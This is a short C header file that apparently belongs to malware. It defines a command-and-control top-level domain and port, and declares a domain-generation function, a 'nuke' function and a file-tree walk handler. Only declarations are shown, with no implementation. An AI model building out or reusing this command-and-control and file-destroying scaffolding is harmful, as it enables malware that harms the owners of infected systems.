#pragma once

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/reboot.h>
//#include <linux/reboot.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ftw.h>
#include <fnmatch.h>

#define PORT          ("9999")
#define CNC_TLD       ("bzh")
#define CMD_SIZE      (4)
//#define KEY_LENGTH    (10)
#define DOMAIN_LENGTH (10)

extern char g_domain[DOMAIN_LENGTH];

void test(void);
void nuke(void);
void abrt(void);

void generate_domain(void);
int handle_file(char const *fpath, struct stat const *tb, int typeflag);
